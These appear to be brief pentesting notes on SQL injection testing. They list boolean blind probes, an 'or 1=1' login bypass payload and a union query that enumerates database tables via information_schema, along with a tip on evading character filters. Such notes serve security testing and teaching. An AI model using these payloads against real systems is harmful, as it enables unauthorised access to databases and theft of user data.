### Testing for Blind Query SQLi
* Blind SQLi queries the database for true and false questions and evaluates the responses from the web server.
````
1' and 1=1
1' order by 1
````

* The following will execute, although the password is wrong. This is because or 1=1 is always a true statement.
````
aaa' or 1=1 #
````



### Testing for Union Query SQLi
* Also attempt to inject without the quote. Stricter security protocols will be looking for illegal characters that will even pick up encodings
````
1' union select table_name, 2 from information_schema.tables
````
